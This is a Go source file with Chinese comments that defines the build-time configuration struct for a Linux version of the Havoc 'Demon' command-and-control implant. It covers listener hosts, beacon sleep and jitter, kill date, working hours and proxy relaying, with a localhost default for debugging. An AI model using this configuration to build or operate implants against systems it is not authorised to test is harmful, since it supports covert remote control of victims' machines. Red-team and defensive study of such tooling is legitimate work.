// Package main - Havoc Demon (Linux 版) 的编译期配置。
//
// 该文件由 teamserver 在生成载荷时覆盖（payloads/DemonLinux/config_gen.go），
// 仓库中保留一份指向本机 127.0.0.1:8080 的默认值，方便手工 `go build` 调试。
//
// 仅用于已获得明确书面授权的测试环境。
package main

// HostPort 是监听器地址（Hosts 中可能带端口）。
type HostPort struct {
	Host string
	Port int
}

// BuildConfig 是烘焙进二进制文件的全部静态配置。
type BuildConfig struct {
	Hosts        []HostPort // 监听器主机列表（按 Hosts 顺序）
	Secure       bool       // true = https / wss
	Method       string     // HTTP 方法（目前仅 POST）
	UserAgent    string
	Headers      []string // 形如 "Accept: */*"
	Uris         []string // 请求路径，随机选择
	HostRotation string   // "round-robin" | "random"
	Sleep        int      // 秒
	Jitter       int      // 0-100
	KillDate     int64    // unix 时间戳，0 = 不启用
	WorkingHours int32    // teamserver 的 working-hours 位图，0 = 不限制

	// HTTP 代理：用于「带代理的 HTTP 监听器」+ 加密传输中继器（tcp/kcp/udp/ws/dns/...）。
	ProxyEnabled  bool
	ProxyType     string // http / https / socks5
	ProxyHost     string
	ProxyPort     int
	ProxyUsername string
	ProxyPassword string
}

// baked 在 config_gen.go 中定义；此处只声明，保证手工构建时也能引用。
//
//go:noinline
func cfg() *BuildConfig { return &baked }
